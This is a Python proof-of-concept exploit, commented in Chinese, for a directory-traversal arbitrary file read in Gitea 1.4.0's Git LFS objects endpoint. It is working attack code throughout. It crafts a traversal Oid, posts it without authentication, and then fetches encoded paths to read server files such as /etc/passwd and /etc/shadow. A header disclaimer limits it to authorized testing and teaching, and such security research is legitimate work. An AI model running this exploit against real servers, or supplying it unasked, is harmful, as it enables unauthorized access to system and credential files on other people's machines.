#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gitea 1.4.0 目录穿越导致任意文件读取 PoC
影响版本：Gitea 1.4.0（可能影响早期版本）
漏洞描述：Git LFS 对象接口对 Oid 参数未做过滤，导致路径穿越，可读取服务器任意文件。
注意：需要目标上存在一个公开仓库（无需认证），且仓库路径已知。
仅用于授权安全测试与教学研究，请勿用于非法用途。
"""

import argparse
import requests
from urllib.parse import quote

def check_repo_public(base_url, owner, repo, timeout=10, verify_ssl=False):
    """简单检查仓库是否可公开访问"""
    url = f"{base_url}/{owner}/{repo}"
    try:
        resp = requests.get(url, timeout=timeout, verify=verify_ssl)
        if resp.status_code == 200 and (owner in resp.text or repo in resp.text):
            return True
        return False
    except Exception:
        return False

def exploit_read_file(base_url, owner, repo, target_file, timeout=10, verify_ssl=False):
    """
    利用路径穿越读取文件。
    :param base_url: Gitea 基础URL，如 http://target:3000
    :param owner: 仓库所有者
    :param repo: 仓库名
    :param target_file: 要读取的服务器文件绝对路径，如 /etc/passwd
    :return: (success, content) 或 (False, error_msg)
    """
    # 构造恶意 Oid：使用 .... 作为文件名的一部分，再结合大量 ../ 穿越至根目录
    # 这里采用类似原始PoC的格式，确保穿越层次足够多
    traversal = "../" * 15
    # 去掉目标文件开头的 /
    clean_file = target_file.lstrip("/")
    oid = f"....{traversal}{clean_file}"

    # LFS 对象接口
    lfs_url = f"{base_url}/{owner}/{repo}.git/info/lfs/objects"

    # 构造 JSON body，部分字段为协议要求，但不需要真实认证
    payload = {
        "Oid": oid,
        "Size": 1000000,
        "User": "a",
        "Password": "a",
        "Repo": "a",
        "Authorization": "a"
    }

    headers = {
        "Accept": "application/vnd.git-lfs+json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (PoC CVE-2018-...)"
    }

    # 第一步：POST 创建 LFS 对象，触发文件复制到可访问目录
    print(f"[*] 正在向 {lfs_url} 发送恶意 LFS 对象...")
    try:
        resp = requests.post(lfs_url, json=payload, headers=headers,
                             timeout=timeout, verify=verify_ssl)
        # 根据Gitea LFS实现，成功时返回 200 或 202，且可能返回对象信息
        if resp.status_code not in (200, 202):
            return False, f"POST 失败，状态码 {resp.status_code}, 响应: {resp.text[:200]}"
    except Exception as e:
        return False, str(e)

    # 第二步：构造读取 URL，将 Oid 中的 / 进行 URL 编码
    encoded_oid = quote(oid, safe='')   # 编码所有特殊字符，包括 '.'
    # 实际上只需要把 / 编码为 %2F，但为了保险全部编码
    # 参考原始PoC，访问路径为 objects/<encoded_oid>/sth，需要追加一个后缀 /sth
    # 尝试两种方式：直接读取和追加 /sth
    read_paths = [
        f"{lfs_url}/{encoded_oid}",        # 尝试直接读取
        f"{lfs_url}/{encoded_oid}/sth",    # 加后缀
    ]

    for read_url in read_paths:
        try:
            print(f"[*] 尝试读取: {read_url}")
            resp = requests.get(read_url, timeout=timeout, verify=verify_ssl)
            if resp.status_code == 200 and resp.text:
                # 过滤 Gitea 错误页面（通常包含 "Page Not Found" 或状态码信息）
                if "not found" not in resp.text.lower() and len(resp.text) > 20:
                    return True, resp.text
                else:
                    print(f"[-] 读取到的内容可能是错误页面: {resp.text[:100]}")
            else:
                print(f"[-] 状态码 {resp.status_code}")
        except Exception as e:
            print(f"[-] 请求异常: {e}")

    return False, "所有读取尝试均失败"

def main():
    parser = argparse.ArgumentParser(
        description="Gitea 1.4.0 任意文件读取 PoC (目录穿越)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python poc.py -u http://192.168.1.1:3000 -r vulhub/repo\n"
            "  python poc.py -u http://target:3000 -r myuser/public -f /etc/shadow\n"
            "  python poc.py -u https://git.example.com -r test/project --no-verify\n\n"
            "请确保指定的仓库为公开状态且存在。"
        )
    )
    parser.add_argument("-u", "--url", required=True, help="Gitea 基础地址 (例如 http://target:3000)")
    parser.add_argument("-r", "--repo", required=True, help="公开仓库完整路径 (例如 owner/repo)")
    parser.add_argument("-f", "--file", default="/etc/passwd", help="要读取的文件路径 (默认: /etc/passwd)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认: 10)")
    parser.add_argument("--no-verify", action="store_true", help="禁用 SSL 证书验证")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    repo_path = args.repo.strip("/")
    parts = repo_path.split("/")
    if len(parts) != 2:
        print("[-] 仓库路径格式错误，应为 owner/repo")
        return
    owner, repo = parts
    target_file = args.file
    verify_ssl = not args.no_verify

    print(f"[*] 目标: {base_url}")
    print(f"[*] 仓库: {owner}/{repo}")
    print(f"[*] 读取文件: {target_file}")

    # 检查仓库是否可访问（可选）
    if not check_repo_public(base_url, owner, repo, args.timeout, verify_ssl):
        print("[!] 警告：无法确认仓库是否公开可访问，将继续尝试...")

    success, content = exploit_read_file(base_url, owner, repo, target_file,
                                         args.timeout, verify_ssl)
    if success:
        print("[+] 成功读取文件内容:")
        print("-" * 60)
        print(content)
        print("-" * 60)
    else:
        print(f"[-] 利用失败: {content}")

if __name__ == "__main__":
    main()